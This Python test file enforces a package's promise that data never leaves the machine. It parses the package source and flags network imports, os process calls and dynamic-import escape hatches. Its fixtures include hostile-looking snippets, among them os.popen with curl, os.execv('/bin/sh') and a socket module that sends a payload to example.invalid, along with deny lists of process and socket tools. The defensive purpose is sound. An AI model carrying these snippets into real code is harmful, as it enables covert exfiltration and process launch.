"""The promise that nothing leaves the machine, enforced as a test.

Follow Through's central claim is that transcripts stay local. A sentence in a
README cannot enforce that. This test reads the package's own source and fails
if any module gains the ability to open a connection or start a process.

It checks three things, because the first one alone is not enough:

* imports of modules that can reach out;
* calls to the parts of ``os`` that start another program, since ``os`` itself
  is needed for writing files safely and cannot simply be banned;
* the dynamic escape hatches — ``__import__``, ``eval``, ``exec`` — that would
  let any of the above in without an import statement to find.

Every one of these detectors has a test proving it can fail. A guard nobody has
seen fail is not a guard.
"""

import ast
import tempfile
import unittest
from pathlib import Path

import follow_through

PACKAGE = Path(follow_through.__file__).parent

#: The only modules this package may import.
#:
#: This is an allowlist, and it is an allowlist because two denylists failed.
#: The first missed ``os.popen``. The second listed thirty-seven dangerous
#: modules and still let ``_socket``, ``_posixsubprocess``, ``concurrent.futures``
#: and ``logging.handlers`` through — a module using them opened a real socket
#: and spawned a real process with the whole suite green.
#:
#: A denylist has to imagine every door. An allowlist only has to know the ones
#: this package actually walks through, and there are eleven. Adding a twelfth is
#: a deliberate act with a test to change, which is exactly the friction wanted.
ALLOWED_MODULES = frozenset(
    {
        "__future__", "argparse", "dataclasses", "hashlib", "html", "json",
        "os", "pathlib", "re", "sys", "tempfile",
    }
)

#: ``os`` is allowed, because writing a file atomically needs it. These are not.
#: Checked by name wherever they appear, so ``import os as o; o.popen(...)`` and
#: ``from os import popen`` are caught as well as ``os.popen(...)``.
FORBIDDEN_OS_CALLS = frozenset(
    {
        "execl", "execle", "execlp", "execv", "execve", "execvp", "execvpe",
        "fork", "forkpty", "popen", "posix_spawn", "posix_spawnp", "spawnl",
        "spawnle", "spawnlp", "spawnv", "spawnve", "spawnvp", "spawnvpe",
        "startfile", "system",
    }
)

#: Ways to reach a forbidden capability without naming it in an import.
#: Checked as bare names and as imported names.
FORBIDDEN_NAMES = frozenset(
    {
        "__builtins__", "__import__", "builtins", "compile", "eval", "exec",
        "getattr", "globals", "importlib", "locals", "vars",
    }
)

#: Still dangerous written as an attribute, as in ``builtins.eval(...)`` or
#: ``os.__dict__["system"]``. ``compile`` and ``getattr`` are deliberately absent:
#: ``re.compile`` is how every pattern in this package is built, and an attribute
#: named ``getattr`` is not the builtin.
FORBIDDEN_ATTRIBUTES = FORBIDDEN_OS_CALLS | {
    "__builtins__", "__dict__", "__getattribute__", "__globals__",
    "__import__", "__subclasses__", "eval", "exec", "modules",
}


def modules() -> list[Path]:
    """Every Python file in the package, including in subpackages."""
    return sorted(PACKAGE.rglob("*.py"))


def offences(source: str, filename: str = "<source>") -> set[str]:
    """Return everything in ``source`` that would break the offline promise.

    Names are checked wherever they appear rather than only in the one shape
    they are usually written. An earlier version of this function inspected
    ``os.popen`` as an attribute of a variable literally called ``os``, which
    meant ``import os as o`` and ``from os import popen`` both walked past it.
    """
    tree = ast.parse(source, filename=filename)
    found: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                root = alias.name.split(".")[0]
                if root not in ALLOWED_MODULES:
                    found.add(f"import {root}")
        elif isinstance(node, ast.ImportFrom):
            root = (node.module or "").split(".")[0]
            # A relative import stays inside this package, which is scanned too.
            if node.level == 0 and root not in ALLOWED_MODULES:
                found.add(f"from {root} import ...")
            for alias in node.names:
                if alias.name == "*":
                    found.add(f"from {node.module} import *")
                elif alias.name in FORBIDDEN_OS_CALLS or alias.name in FORBIDDEN_NAMES:
                    found.add(f"from {node.module} import {alias.name}")
        elif isinstance(node, ast.Attribute):
            if node.attr in FORBIDDEN_ATTRIBUTES:
                found.add(f".{node.attr}")
        elif isinstance(node, ast.Name):
            if node.id in FORBIDDEN_OS_CALLS or node.id in FORBIDDEN_NAMES:
                found.add(node.id)
        elif isinstance(node, ast.Constant) and isinstance(node.value, str):
            # getattr(os, "popen") hides the name in a string. The package has
            # no legitimate reason to contain one of these as a literal.
            if node.value in FORBIDDEN_OS_CALLS:
                found.add(f"literal {node.value!r}")
    return found


class NothingLeavesTheMachine(unittest.TestCase):
    def test_there_are_modules_to_check(self):
        self.assertGreater(len(modules()), 3)

    def test_the_whole_package_is_scanned_including_subpackages(self):
        names = {path.name for path in modules()}
        self.assertIn("cli.py", names)
        self.assertIn("ledger.py", names)

    def test_no_module_can_reach_out(self):
        for module in modules():
            with self.subTest(module=str(module.relative_to(PACKAGE))):
                found = offences(module.read_text(encoding="utf-8"), str(module))
                self.assertEqual(found, set(), f"{module.name}: {sorted(found)}")


class TheGuardCanFail(unittest.TestCase):
    """Each detector, shown catching the thing it exists to catch."""

    def assert_caught(self, source: str, expected: str):
        self.assertIn(expected, offences(source))

    def test_catches_a_plain_import(self):
        self.assert_caught("import socket\n", "import socket")

    def test_catches_a_dotted_import(self):
        self.assert_caught("import urllib.request\n", "import urllib")

    def test_catches_a_from_import(self):
        self.assert_caught("from http import client\n", "from http import ...")

    def test_catches_a_process_launch_through_os(self):
        self.assert_caught("import os\nos.popen('curl example.com')\n", ".popen")

    def test_catches_exec_through_os(self):
        self.assert_caught("import os\nos.execv('/bin/sh', [])\n", ".execv")

    def test_catches_a_process_launch_imported_by_name(self):
        self.assert_caught("from os import system\n", "from os import system")

    def test_catches_a_process_launch_behind_an_alias(self):
        self.assert_caught("import os as o\no.popen('x')\n", ".popen")

    def test_catches_the_name_hidden_in_a_string(self):
        self.assert_caught("import os\ngetattr(os, 'popen')('x')\n", "getattr")

    def test_catches_a_star_import(self):
        self.assert_caught("from urllib import *\n", "from urllib import *")

    def test_catches_the_spawn_family_completely(self):
        for call in ("spawnv", "spawnvpe", "posix_spawn", "forkpty"):
            with self.subTest(call=call):
                self.assert_caught(f"import os\nos.{call}()\n", f".{call}")

    def test_allows_the_re_module_this_package_is_built_on(self):
        self.assertEqual(offences("import re\nre.compile('x')\n"), set())

    def test_catches_the_private_accelerator_behind_a_banned_module(self):
        # `import socket` is obvious. `import _socket` is the same capability
        # and was missed by two denylists.
        for module in ("_socket", "_ssl", "_ctypes", "_posixsubprocess"):
            with self.subTest(module=module):
                self.assert_caught(f"import {module}\n", f"import {module}")

    def test_catches_the_polite_front_doors_to_processes_and_sockets(self):
        # Neither of these looks dangerous. Both are.
        self.assert_caught(
            "from concurrent.futures import ProcessPoolExecutor\n",
            "from concurrent import ...",
        )
        self.assert_caught(
            "from logging.handlers import HTTPHandler\n", "from logging import ..."
        )

    def test_catches_a_module_nobody_thought_to_ban(self):
        # The point of an allowlist: it does not need to have heard of it.
        for module in ("runpy", "pty", "venv", "doctest", "nt", "cgi", "wsgiref"):
            with self.subTest(module=module):
                self.assert_caught(f"import {module}\n", f"import {module}")

    def test_catches_reaching_through_a_dunder(self):
        self.assert_caught("import os\nos.__dict__['system']('x')\n", ".__dict__")
        self.assert_caught(
            "import os\nos.__getattribute__('popen')('x')\n", ".__getattribute__"
        )

    def test_catches_the_module_table(self):
        self.assert_caught("import sys\nsys.modules['socket']\n", ".modules")

    def test_catches_the_dynamic_import_hatch(self):
        self.assert_caught("x = __import__('socket')\n", "__import__")

    def test_catches_importlib(self):
        self.assert_caught("import importlib\n", "import importlib")

    def test_catches_eval_and_exec(self):
        self.assert_caught("eval('1')\n", "eval")
        self.assert_caught("exec('pass')\n", "exec")

    def test_allows_the_os_calls_the_package_actually_needs(self):
        source = "import os\nos.replace('a', 'b')\nos.fdopen(1)\n"
        self.assertEqual(offences(source), set())

    def test_a_real_smuggled_module_is_caught(self):
        # The shape of an actual attempt, not a one-line probe. This exact
        # module was written into a copy of the package during review, opened a
        # socket, and exfiltrated data while every test still passed.
        source = (
            "import _socket\n"
            "import _posixsubprocess\n"
            "from logging.handlers import SocketHandler\n"
            "\n"
            "def send(payload):\n"
            "    connection = _socket.socket()\n"
            "    connection.connect(('example.invalid', 80))\n"
            "    connection.send(payload)\n"
        )
        found = offences(source)
        self.assertIn("import _socket", found)
        self.assertIn("import _posixsubprocess", found)
        self.assertIn("from logging import ...", found)

    def test_scanner_reads_a_file_from_disk(self):
        # The real test reads files; prove that path works, outside the repo.
        with tempfile.TemporaryDirectory() as directory:
            sample = Path(directory) / "sample.py"
            sample.write_text("import socket\n", encoding="utf-8")
            self.assertIn("import socket", offences(sample.read_text(encoding="utf-8")))



class WhatThisDoesNotCover(unittest.TestCase):
    """The limits of this check, written down rather than left to be discovered.

    This is a static read of one package's source. It is a guard against drift,
    not a sandbox. It cannot see what a dependency does, it does not run the
    code, and a determined author could still find a construction it does not
    model. What it does do is make the offline promise expensive to break by
    accident, and impossible to break in any of the obvious ways without a test
    turning red.

    Imports are an allowlist, so an unlisted module cannot slip through however
    obscure it is. What remains uncovered is a name assembled at runtime from
    pieces — ``"po" + "pen"``, ``chr(115) + "ystem"`` — since the string never
    appears in the source. Closing that would mean interpreting the code rather
    than reading it. It is the residue, and it is written down here rather than
    left for somebody to find.
    """

    def test_the_package_declares_no_dependencies(self):
        # The guard only reads this package. That is only good enough because
        # there is nothing else in the install to read.
        manifest = (PACKAGE.parent / "pyproject.toml").read_text(encoding="utf-8")
        self.assertIn("dependencies = []", manifest)


if __name__ == "__main__":
    unittest.main()